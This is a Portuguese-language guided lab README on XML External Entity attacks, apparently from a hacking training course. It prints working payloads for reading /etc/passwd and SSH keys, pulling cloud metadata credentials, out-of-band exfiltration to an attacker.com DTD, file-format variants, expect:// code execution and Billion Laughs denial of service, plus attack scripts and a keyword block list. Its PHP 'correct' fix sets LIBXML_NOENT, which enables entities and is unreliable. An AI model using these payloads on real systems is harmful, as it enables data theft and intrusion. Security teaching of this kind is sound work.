# 🗂️ XML External Entity (XXE) - Laboratório Guiado Completo

## 📋 Visão Geral

**Dificuldade**: 🟡 Intermediário → 🔴 Avançado
**Tempo estimado**: 3-5 horas
**Pontos**: 80 (15 + 30 + 35)

### O Que Você Vai Aprender

✅ Fundamentos de XML e DTD
✅ XXE básico (file read)
✅ XXE para SSRF
✅ Blind XXE exploitation
✅ XXE via SVG, DOCX, XLSX
✅ Billion Laughs Attack (DoS)
✅ Prevention e mitigation

---

## 📖 Teoria Completa

### O Que É XXE?

XML External Entity (XXE) é uma vulnerabilidade que ocorre quando aplicação processa XML de forma insegura, permitindo que atacante injete entidades externas maliciosas.

### XML Basics

**XML (eXtensible Markup Language):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<user>
    <name>Alice</name>
    <email>alice@example.com</email>
</user>
```

**DTD (Document Type Definition):**
Define estrutura e entidades do XML.

```xml
<!DOCTYPE user [
  <!ELEMENT user (name,email)>
  <!ELEMENT name (#PCDATA)>
  <!ELEMENT email (#PCDATA)>
]>
```

### Entidades XML

```xml
<!-- Entidades internas -->
<!ENTITY author "John Doe">
<text>Written by &author;</text>
<!-- Resultado: Written by John Doe -->

<!-- Entidades externas -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<data>&xxe;</data>
<!-- Resultado: conteúdo de /etc/passwd -->
```

---

## 💣 XXE Básico - File Read

### Payload Simples

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

**Resultado:** Aplicação retorna conteúdo de `/etc/passwd`.

### Código Vulnerável

```python
# VULNERÁVEL ❌
import xml.etree.ElementTree as ET

xml_data = request.data
root = ET.fromstring(xml_data)  # Processa entidades externas!
data = root.find('data').text
return data  # Retorna conteúdo do arquivo!
```

### Arquivos Interessantes

```
Linux:
/etc/passwd          - Lista de usuários
/etc/shadow          - Hashes de senhas (requer root)
/etc/hosts           - Mapeamento de hosts
~/.ssh/id_rsa        - Chave SSH privada
/proc/self/environ   - Variáveis de ambiente
/var/log/apache2/access.log  - Logs

Windows:
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\Users\{user}\Desktop\passwords.txt
```

---

## 🌐 XXE para SSRF

### Acesso a Recursos Internos

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<root>
  <data>&xxe;</data>
</root>
```

### Cloud Metadata

```xml
<!-- AWS -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

<!-- GCP -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">

<!-- Azure -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01">
```

---

## 👁️ Blind XXE

Quando aplicação não retorna dados diretamente, mas processa XML.

### Out-of-Band (OOB) XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<root></root>
```

**evil.dtd no servidor atacante:**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

**Fluxo:**
1. Vítima processa XML
2. Carrega DTD externo de attacker.com
3. DTD lê /etc/passwd
4. Envia conteúdo para attacker.com via HTTP

### Error-Based XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

Erro expõe conteúdo do arquivo.

---

## 🎯 XXE em Diferentes Formatos

### 1. SVG Images

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="500" height="500">
  <text x="10" y="20">&xxe;</text>
</svg>
```

**Upload como imagem!**

### 2. DOCX Files

DOCX são arquivos ZIP contendo XML.

```bash
# Extrair
unzip document.docx

# Editar word/document.xml
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<document>
  <text>&xxe;</text>
</document>

# Recriar
zip -r malicious.docx *
```

### 3. XLSX Files

Similar ao DOCX, editar `xl/workbook.xml`.

### 4. PDF (via XFA)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xfa:data>
  <x>&xxe;</x>
</xfa:data>
```

### 5. SOAP API

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope>
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>
```

---

## 💥 XXE to RCE

### Via PHP expect://

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

**Requer:** PHP com módulo expect instalado (raro).

### Via PHAR Deserialization (PHP)

```xml
<!ENTITY xxe SYSTEM "phar://malicious.phar">
```

---

## 🌪️ Billion Laughs Attack (DoS)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

**Resultado:** Expansão exponencial consome toda memória (DoS).

---

## 🛠️ Ferramentas

### 1. Manual Testing

```python
import requests

xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>'''

response = requests.post(
    'http://target.com/api/parse',
    data=xxe_payload,
    headers={'Content-Type': 'application/xml'}
)

print(response.text)
```

### 2. XXEinjector

```bash
# Blind XXE
python3 XXEinjector.py --host=target.com --path=/upload \
  --file=payload.xml --oob=http --phpfilter

# Direct XXE
python3 XXEinjector.py --host=target.com --path=/parse \
  --file=test.xml --enumports=80,8080,3306
```

### 3. Burp Suite

- Intruder com payloads XXE
- Collaborator para Blind XXE (OOB)

---

## 🛡️ Prevenção

### 1. Desabilitar Entidades Externas

**Python (lxml):**
```python
# CORRETO ✅
from lxml import etree

parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.fromstring(xml_data, parser)
```

**Python (xml.etree.ElementTree):**
```python
# CORRETO ✅
# Por padrão, ElementTree NÃO processa entidades externas
# Mas use defusedxml para garantir:

from defusedxml import ElementTree as ET
tree = ET.fromstring(xml_data)
```

**Java:**
```java
// CORRETO ✅
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**PHP:**
```php
// CORRETO ✅
libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
```

### 2. Use Bibliotecas Seguras

```python
# CORRETO ✅
import defusedxml.ElementTree as ET

xml_data = request.data
tree = ET.fromstring(xml_data)  # Seguro!
```

### 3. Validação de Input

```python
# CORRETO ✅
def validate_xml(xml_string):
    # Bloqueia DOCTYPE
    if '<!DOCTYPE' in xml_string or '<!ENTITY' in xml_string:
        raise ValueError("DTD/Entity not allowed")

    # Bloqueia SYSTEM/PUBLIC
    if 'SYSTEM' in xml_string or 'PUBLIC' in xml_string:
        raise ValueError("External entities not allowed")

    return xml_string
```

### 4. Use JSON ao Invés de XML

```python
# CORRETO ✅ - JSON não tem entidades externas!
import json

data = json.loads(request.data)
```

---

## 🎯 Estrutura do Laboratório

### 1. 🟢 Basic App (15 pontos)
- **Porta**: 5100
- **Cenário**: API de processamento XML
- XXE básico (file read)
- SSRF via XXE
- Billion Laughs

### 2. 🟡 Intermediate App (30 pontos)
- **Porta**: 5101
- **Cenário**: Document processor
- Blind XXE (OOB)
- XXE via SVG upload
- Error-based extraction

### 3. 🔴 Advanced App (35 pontos)
- **Porta**: 5102
- **Cenário**: Enterprise integration
- XXE via SOAP
- XXE to RCE
- Multi-step exploitation

---

## 📝 Checklist de Conclusão

- [ ] Entendi conceito de XML e DTD
- [ ] Executei XXE básico para ler arquivo
- [ ] Usei XXE para SSRF
- [ ] Explorei Blind XXE com OOB
- [ ] Executei Billion Laughs Attack
- [ ] Explorei XXE via SVG upload
- [ ] Acessei cloud metadata via XXE
- [ ] Implementei proteção contra XXE
- [ ] Testei com defusedxml
- [ ] Completei todos os exercícios

**Total**: 80 pontos

---

## 🎓 Próximos Passos

Após dominar XXE:

1. **XPath Injection**
2. **XML Signature Wrapping**
3. **SAML attacks**
4. **Advanced SOAP exploitation**

**Próximo Lab**: [11 - Race Conditions →](../11-race-conditions/README.md)

---

**Boa sorte e happy hacking! 🗂️**
